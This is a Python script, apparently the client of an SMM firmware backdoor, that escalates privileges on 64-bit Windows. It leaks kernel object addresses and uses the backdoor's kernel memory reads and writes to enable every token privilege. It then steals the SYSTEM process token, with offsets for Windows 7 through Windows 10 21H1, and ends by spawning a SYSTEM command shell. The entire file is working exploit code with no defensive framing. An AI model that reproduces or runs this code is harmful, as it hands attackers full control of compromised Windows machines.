#!/usr/bin/env python

import sys, os, platform, ctypes, ctypes.wintypes
from struct import pack, unpack

import smm_backdoor as bd


# MSR register used by swapgs
IA32_KERNEL_GS_BASE = 0xc0000102

# OpenProcess() access flags
PROCESS_QUERY_INFORMATION = 0x400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

# OpenProcessToken() access flags
TOKEN_ADJUST_PRIVILEGES = 0x20

# _TOKEN structure field offsets
TOKEN_Privileges_Preset  = 0x40
TOKEN_Privileges_Enabled = 0x48

# value for _SEP_TOKEN_PRIVILEGES Present and Enabled fields
TOKEN_PRIVILEGES_VAL = 0x1ff2ffffbc

# system process PID
SYSTEM_PID = 4


def get_object_addr(process_id, handle_value):

    # NTSTATUS values
    STATUS_SUCCESS              = 0x00000000
    STATUS_INFO_LENGTH_MISMATCH = 0xc0000004

    # information class
    SystemHandleInformation = 16

    # change return value to unsigned
    ntdll = ctypes.windll.ntdll
    ntdll.NtQuerySystemInformation.restype = ctypes.c_ulong

    size = ctypes.sizeof(ctypes.c_void_p)

    class SYSTEM_HANDLE(ctypes.Structure):

        _fields_ = [( 'ProcessId',          ctypes.wintypes.DWORD  ),
                    ( 'ObjectType',         ctypes.wintypes.BYTE   ),
                    ( 'HandleAttributes',   ctypes.wintypes.BYTE   ),
                    ( 'HandleValue',        ctypes.wintypes.WORD   ),
                    ( 'ObjectAddress',      ctypes.wintypes.LPVOID ),
                    ( 'GrantedAccess',      ctypes.wintypes.DWORD  )]

    while True:            

        # allocate information buffer
        buff = ctypes.c_buffer(size)
    
        # get system handles information
        return_length = ctypes.c_ulong(0)    
        return_status = ntdll.NtQuerySystemInformation(SystemHandleInformation, buff, size, 
                                                       ctypes.byref(return_length))

        if return_status == STATUS_SUCCESS:

            # return length sanity check
            assert return_length.value % ctypes.sizeof(SYSTEM_HANDLE) == ctypes.sizeof(ctypes.c_uint64)

            # calculate number of returned handles
            count = (return_length.value - ctypes.sizeof(ctypes.c_uint64)) / ctypes.sizeof(SYSTEM_HANDLE)

            class SYSTEM_HANDLE_INFORMATION(ctypes.Structure):

                _fields_ = [( 'HandleCount',    ctypes.c_ulong        ),
                            ( 'Handles',        SYSTEM_HANDLE * count )]    

            # get SYSTEM_HANDLE_INFORMATION from the raw buffer
            info = SYSTEM_HANDLE_INFORMATION.from_buffer_copy(buff)

            for handle in info.Handles:

                # match handle value
                if handle.ProcessId == process_id and handle.HandleValue == handle_value:

                    # return object address
                    return handle.ObjectAddress

            break

        elif return_status == STATUS_INFO_LENGTH_MISMATCH:

            # set buffer size, add 0x1000 just for sure
            size = return_length.value + 0x1000

        else:

            raise(Exception('NtQuerySystemInformation() ERROR 0x%x' % return_status))

    # handle information is not found
    return None


def privesc(command_line = None):

    try:

        # get windows version and build number
        os_major, os_minor, os_build = map(lambda n: int(n), platform.version().split('.'))

    except ValueError:

        print('ERROR: Unable to get NT version')
        return -1 

    print('[+] NT version is %d.%d.%d' % (os_major, os_minor, os_build))
    
    EPROCESS_Token = None
    KPCR_KernelDirectoryTableBase = None

    if os_major == 6 and os_minor == 1:

        # Windows 7 and Server 2008 R2
        EPROCESS_Token = 0x0208

    elif os_major == 6 and os_minor == 2:

        # Windows 8 and Server 2012
        EPROCESS_Token = 0x0348

    elif os_major == 6 and os_minor == 3:

        # Windows 8.1 and Server 2012 R2
        EPROCESS_Token = 0x0348

    elif os_major == 10 and os_minor == 0:

        if os_build > 19043:

            raise(Exception('Unsupported Windows 10 version'))   

        elif os_build >= 19041:

            # Windows 10 starting from 2004 and Server 2019
            EPROCESS_Token = 0x04b8

        elif os_build >= 18362:

            # Windows 10 starting from 1903 and Server 2019
            EPROCESS_Token = 0x0360

        else:

            # Windows 10 and Server 2016
            EPROCESS_Token = 0x0358

        # kernel CR3 offsset from GS segment base
        if os_build in [19043, 19042, 19041]:

            # 21H1, 20H2, 2004
            KPCR_KernelDirectoryTableBase = 0x9000

        elif os_build in [18363, 18362, 17763, 17134]:

            # 1909, 1903, 1809, 1803
            KPCR_KernelDirectoryTableBase = 0x7000

    else:

        raise(Exception('Unsupported NT version'))

    print('[+] _EPROCESS Token offset is 0x%.4x' % EPROCESS_Token)

    # get user mode CR3 value
    user_cr3 = bd.state_get(bd.SMM_SAVE_STATE_CR3)    

    if KPCR_KernelDirectoryTableBase is not None:

        print('[+] _KPCR KernelDirectoryTableBase offset is 0x%.4x' % KPCR_KernelDirectoryTableBase)

        # get kernel GS base
        kpcr_addr = bd.msr_get(IA32_KERNEL_GS_BASE)    

        print('[+] _KPCR structure is at 0x%.16x' % kpcr_addr)

        # read kernel mode CR3 value for KVA shadow enabled system
        kernel_cr3 = bd.read_virt_mem_8(kpcr_addr + KPCR_KernelDirectoryTableBase, cr3 = user_cr3)

    else:

        # KVA shadow is not present on this OS version
        kernel_cr3 = 0

    if kernel_cr3 == 0:

        # KVA shadow is disabled
        kernel_cr3 = user_cr3

        print('[+] KVA shadow is disabled or not present')
        print('[+] Kernel CR3 value is 0x%.16x' % kernel_cr3)

    else:

        print('[+] KVA shadow is enabled')
        print('[+] User CR3 value is 0x%.16x' % user_cr3)
        print('[+] Kernel CR3 value is 0x%.16x' % kernel_cr3)

    kernel32 = ctypes.windll.kernel32

    # open current process
    cur_proc_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, 0, os.getpid())
    if cur_proc_handle == 0:

        print('ERROR: OpenProcess() fails')
        return -1

    cur_token_handle = ctypes.wintypes.HANDLE(0)

    # open current process token
    if kernel32.OpenProcessToken(cur_proc_handle, TOKEN_ADJUST_PRIVILEGES, 
                                 ctypes.byref(cur_token_handle)) == 0:

        print('ERROR: OpenProcessToken() fails')
        return -1

    # get token object address
    cur_token_addr = get_object_addr(os.getpid(), cur_token_handle.value)
    if cur_token_addr is None:

        print('ERROR: Unable to find token object address')
        return -1

    print('[+] Token object address is 0x%.8x' % cur_token_addr)

    # read present privileges field
    priv_present = bd.read_virt_mem_8(cur_token_addr + TOKEN_Privileges_Preset, cr3 = kernel_cr3)

    print('[+] Present privileges: 0x%x -> 0x%x' % (priv_present, TOKEN_PRIVILEGES_VAL))

    # read enabled privileges field
    priv_enabled = bd.read_virt_mem_8(cur_token_addr + TOKEN_Privileges_Enabled, cr3 = kernel_cr3)

    print('[+] Enabled privileges: 0x%x -> 0x%x' % (priv_enabled, TOKEN_PRIVILEGES_VAL))

    # update _SEP_TOKEN_PRIVILEGES fields
    bd.write_virt_mem_8(cur_token_addr + TOKEN_Privileges_Preset, TOKEN_PRIVILEGES_VAL, cr3 = kernel_cr3)
    bd.write_virt_mem_8(cur_token_addr + TOKEN_Privileges_Enabled, TOKEN_PRIVILEGES_VAL, cr3 = kernel_cr3)

    # open system process
    sys_proc_handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, SYSTEM_PID)
    if sys_proc_handle == 0:

        print('ERROR: OpenProcess() fails')
        return -1

    # get current process object address
    cur_proc_addr = get_object_addr(os.getpid(), cur_proc_handle)
    if cur_proc_addr is None:

        print('ERROR: Unable to find current process object address')
        return -1

    print('[+] Current process object address is 0x%.8x' % cur_proc_addr)

    # get system process object address
    sys_proc_addr = get_object_addr(os.getpid(), sys_proc_handle)
    if sys_proc_addr is None:

        print('ERROR: Unable to find current process object address')
        return -1

    print('[+] System process object address is 0x%.8x' % sys_proc_addr)
    print('[+] Overwriting process token...')

    # read system process token
    token = bd.read_virt_mem_8(sys_proc_addr + EPROCESS_Token, cr3 = kernel_cr3)

    # update current process token
    bd.write_virt_mem_8(cur_proc_addr + EPROCESS_Token, token, cr3 = kernel_cr3)

    if command_line is None:

        print('[+] Done, spawning SYSTEM shell...\n')

        # spawn shell
        os.system('cmd.exe')

    else:

        os.system(command_line)

    return 0


def main():

    # check OS
    assert platform.system() == 'Windows'

    # check for 64-bit process
    assert ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_uint64)

    print('[+] Initializing SMM backdoor client...')

    bd.init(use_timer = True)
    bd.ping()

    return privesc()    


if __name__ == '__main__':

    exit(main())

#
# EoF
#
